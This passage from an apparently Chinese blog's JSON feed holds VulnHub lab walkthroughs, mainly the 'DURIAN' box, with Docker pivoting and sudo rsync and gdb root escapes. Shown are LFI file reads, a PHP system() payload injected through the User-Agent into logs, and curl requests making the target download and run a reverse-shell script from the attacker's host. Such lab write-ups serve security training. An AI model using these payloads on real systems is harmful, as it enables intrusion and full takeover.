alt=\"Image\">\n<p>写入 mkfifo 构造好的反弹 shell 的代码并保存</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1578.png\" width=\"660\" alt=\"Image\">\n<p>用 curl 执行的同时，用来监听这个端口等到接收反弹 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1579.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"gpg文件解密\"><a class=\"markdownIt-Anchor\" href=\"#gpg文件解密\">#</a> gpg 文件解密</h3>\n<p>发现有 p48 这个用户，切换后输入 electrico 即可切换成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1580.png\" width=\"440\" alt=\"Image\">\n<p>发现了一个 gpg 的私钥文件，看来就是邮件系统中提醒我们用来解开 gpg 加密后的 ssh 密钥的一个密匙</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1581.png\" width=\"440\" alt=\"Image\">\n<p>有一个非常好的解密 gpg 的工具 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZ3B0b29sLmdpdGh1Yi5pby8=\">https://pgptool.github.io/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1582.png\" width=\"620\" alt=\"Image\">\n<p>下载好一个 jar 包，选取解密模块，将邮件系统中的 gpg 导入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1583.png\" width=\"620\" alt=\"Image\">\n<p>提示需要一个密码，输入 p48 的密码 electrico</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1584.png\" width=\"520\" alt=\"Image\">\n<p>输入解密成功之后导出的文件的位置</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1585.png\" width=\"620\" alt=\"Image\">\n<p>解密成功得到了一个 ssh 的私钥文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1586.png\" width=\"460\" alt=\"Image\">\n<h3 id=\"docker容器提权\"><a class=\"markdownIt-Anchor\" href=\"#docker容器提权\">#</a> docker 容器提权</h3>\n<p>没有用到在用户目录下得到的密匙文件，但是照样把这个 key 得到了，这个 key 理论上是可以登陆到 p48 用户的，但是需要注意的是，靶机上没有开放 ssh 端口，那我们应该怎么连呢</p>\n<p>先把这个文件给 echo 到靶机上，并且改变私钥文件的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1587.png\" width=\"460\" alt=\"Image\">\n<blockquote>\n<p>注意到当前靶机的 ip 地址中有 dokcer 网卡，既然靶机上没有开放 ssh 端口无法通过 p48 的密钥接入到 p48 用户上，那么是不是可以先用私钥文件进到一台开通了 ssh 协议的 docker 容器中呢，就试试看</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1588.png\" width=\"660\" alt=\"Image\">\n<p>测试一下出了 172.17.0.1 的网关地址之外，存活的 docker 主机，找到一台 172.17.0.2 是存活主机</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1589.png\" width=\"660\" alt=\"Image\">\n<p><code>ssh p48@172.17.0.2 -i id_rsa</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1590.png\" width=\"470\" alt=\"Image\">\n<p>成功进入到了 docker 容器内部，用的 p 48 这个用户进去的，看 hostname 像是在 docker 容器内部，而且有 sudo 权限设置错误，可以直接调用 root 的 rsync<br>\n <code>sudo rsync -e 'sh -c &quot;sh 0&lt;&amp;2 1&gt;&amp;2&quot;' 127.0.0.1:/dev/null</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1591.png\" width=\"660\" alt=\"Image\">\n<blockquote>\n<p>提权到了 root 之后，由于我们还在 docker 内部，ip 也只有一个本地回环地址和一个 docker 虚拟出来的 ip，但是我们可以与 docker 的网关地址，即宿主机直接通信，连接到 172.17.0.1 就相当于连接到了宿主机，而我们在 docker 内部连的时候是不需要外部开通 22 端口的  <code>ssh root@172.17.0.1</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1592.png\" width=\"580\" alt=\"Image\">\n<p>查看 ip 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1593.png\" width=\"660\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限，并且查看到 ip 是宿主机的 ip</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/149%20DURIAN/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/149%20DURIAN/",
            "title": "VULNHUB 49 DURIAN",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==\">https://www.vulnhub.com/entry/cereal-1,703/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==\">https://www.cnblogs.com/sainet/p/15779414.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 DURIAN：桥接于 192.168.0.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1518.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip 192.168.0.187</p>\n<p>2 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息</p>\n<p><code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.188 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1519.png\" width=\"520\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1520.png\" width=\"400\" alt=\"Image\">\n<blockquote>\n<p>检索到的有效服务如下所示：<br>\n22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 80 7080 8000 8088 http：可对 web 进行渗透测试收集信息</p>\n</blockquote>\n<h3 id=\"lfi-漏洞测试\"><a class=\"markdownIt-Anchor\" href=\"#lfi-漏洞测试\">#</a> lfi 漏洞测试</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODgv\">http://192.168.0.188/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1521.png\" width=\"520\" alt=\"Image\">\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/dirb/wordlists/common.txt -u http://192.168.0.188/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1522.png\" width=\"660\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1523.png\" width=\"520\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEv\">http://192.168.0.172/cgi-data/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1524.png\" width=\"370\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhw\">http://192.168.0.172/cgi-data/getImage.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1525.png\" width=\"580\" alt=\"Image\">\n<p>有文件包含漏洞，测试读取 /etc/passwd<br>\n <code>view-source:http://192.168.0.172/cgi-data/getImage.php?file=../../../../../etc/passwd</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1526.png\" width=\"660\" alt=\"Image\">\n<p>得到了两个有 bash 的用户，测试能否读取到私钥文件<br>\n <code>view-source:http://192.168.0.172/cgi-data/getImage.php?file=../../../../../home/durian/.ssh/id_rsa</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1527.png\" width=\"660\" alt=\"Image\">\n<p>没有读取到私钥文件，此 lfi 漏洞利用还需要配合其他的漏洞，如果知道了日志文件地址，是可以尝试往日志里边写后门的</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>查看一下其他的信息，获取到更多的信息</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNzIvYmxvZw==\">http://192.168.0.172/blog</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1528.png\" width=\"620\" alt=\"Image\">\n<p>7080 站点有一个登陆框，但是不存在弱口令，sql 注入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1529.png\" width=\"520\" alt=\"Image\">\n<p>8000 站点是一张图片，需要目录收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1530.png\" width=\"520\" alt=\"Image\">\n<p>没有发现什么敏感的目录信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1531.png\" width=\"620\" alt=\"Image\">\n<p>8088 页面也是一个图片，没有什么特点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1532.png\" width=\"520\" alt=\"Image\">\n<p>搜寻目录之后发现一些特殊的目录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1533.png\" width=\"660\" alt=\"Image\">\n<p>发现大部分页面都是 403 , 没有利用的价值</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1534.png\" width=\"520\" alt=\"Image\">\n<p>有一个界面有登陆框和密码，可以用来爆破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1535.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"lfi日志文件写木马\"><a class=\"markdownIt-Anchor\" href=\"#lfi日志文件写木马\">#</a> lfi 日志文件写木马</h3>\n<p>综上是能收集到所有的信息，登陆框处由于缺少用户名，是很难爆破出来的，</p>\n<p>唯一有价值的线索指向了 lfi 漏洞，多次尝试之后找到了日志的路径</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhwP2ZpbGU9L3Zhci9sb2cvZHVyaWFuLmxvZy9hY2Nlc3MubG9n\">http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1536.png\" width=\"590\" alt=\"Image\">\n<p>既然信息能够被保存在这里，就给发送一个带木马的信息，修改 UA 头</p>\n<p>这里直接用 curl 命令来写，可以用 burp 将数据转化为 curl 命令<br>\n <code>curl -v -X $'GET' -H $'User-Agent: Mozilla/5.0 &lt;?php system($_GET[\\'X_T\\']); ?&gt; (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36' $'http://192.168.0.188/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;X_T=whoami'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1537.png\" width=\"660\" alt=\"Image\">\n<p>并且命令被执行了，收到了 www-data 即当前用户名</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1538.png\" width=\"660\" alt=\"Image\">\n<p>既然能够执行命令，那么就准备用日志来反弹 shell，准备如下代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1539.png\" width=\"360\" alt=\"Image\">\n<p>通过修改数据报使靶机下载 kali 上准备好的反弹 shell 的代码</p>\n<p><code>GET http://192.168.0.188/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;X_T=wget+http://192.168.0.168/shell.sh+-O+/var/www/html/blog/shell.sh HTTP/1.1</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1540.png\" width=\"660\" alt=\"Image\">\n<p>但是失败了，没有下载提示，也没有合适的数据报返回</p>\n<h3 id=\"post型木马尝试\"><a class=\"markdownIt-Anchor\" href=\"#post型木马尝试\">#</a> post 型木马尝试</h3>\n<p>改为 post 的方式，写一个后门文件看看，居然写成功了，但是不知道怎么访问</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1541.png\" width=\"620\" alt=\"Image\">\n<p>用 lfi 漏洞的位置访问时是无法写入任何文件的，是个假后门</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1542.png\" width=\"620\" alt=\"Image\">\n<p>并且也不能修改原有的所有代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1543.png\" width=\"620\" alt=\"Image\">\n<p>还是从数据包来下手，可能下载成功了没有回显，索性就直接尝试执行本应该下载好的文件位置的 sh 脚本，看能不能把 shell 反弹出来</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1544.png\" width=\"660\" alt=\"Image\">\n<p>但是没有反弹出来，很奇怪</p>\n<h3 id=\"防火墙策略\"><a class=\"markdownIt-Anchor\" href=\"#防火墙策略\">#</a> 防火墙策略</h3>\n<p>试了大半天没有结果，直接重新导入靶机了，这次靶机 ip 发生变化了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1545.png\" width=\"580\" alt=\"Image\">\n<p>再次用 burp 捕获数据，思考为什么不能反弹</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1546.png\" width=\"550\" alt=\"Image\">\n<p>既然可以执行命令，执行处 id 的结果，说明命令执行没有问题，但是去下载 python 简易 web 上的程序时出错了，很有可能是防火墙的问题，果然一看，防火墙不知道因为什么原因打开了，就一直卡住了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1547.png\" width=\"420\" alt=\"Image\">\n<p>关闭防火墙，再次测试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1548.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"curl指定数据包\"><a class=\"markdownIt-Anchor\" href=\"#curl指定数据包\">#</a> curl 指定数据包</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用curl发送数据包，下载木马</span></span><br><span class=\"line\">curl -i -s -k -X $&#x27;GET&#x27; \\</span><br><span class=\"line\">-H $&#x27;User-Agent: Mozilla/5.0 &lt;?php system($_GET[\\&#x27;y\\&#x27;]);?&gt; (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27; \\</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\"><span class=\"string\">&#x27;http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;y=wget+http://192.168.0.168/shell.sh+-O+/var/www/html/blog/shell1.sh&#x27;</span></span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1549.png\" width=\"660\" alt=\"Image\">\n<p>当看到 python 服务器上有了回馈信息后，就说明是正确的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1550.png\" width=\"480\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行下载的程序，并且用来接收shell</span></span><br><span class=\"line\">curl -i -s -k -X $&#x27;GET&#x27; \\</span><br><span class=\"line\">-H $&#x27;User-Agent: Mozilla/5.0 &lt;?php system($_GET[\\&#x27;y\\&#x27;]);?&gt; (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27; \\</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\"><span class=\"string\">&#x27;http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;y=bash+/var/www/html/blog/shell1.sh&#x27;</span></span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1551.png\" width=\"660\" alt=\"Image\">\n<p>成功拿到网站权限，开始提权</p>\n<h3 id=\"sudogdb提权\"><a class=\"markdownIt-Anchor\" href=\"#sudogdb提权\">#</a> sudo (gdb) 提权</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1saW5wZWFzLTR0M2tnbWkzOHEuc2g=\">放一个 linpeas.sh</span>, 查到 gdb 权限设置错误</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1552.png\" width=\"480\" alt=\"Image\">\n<p>参照 gtfobin，直接提权为 root 用户<br>\n <code>gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1553.png\" width=\"540\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        }
    ]
}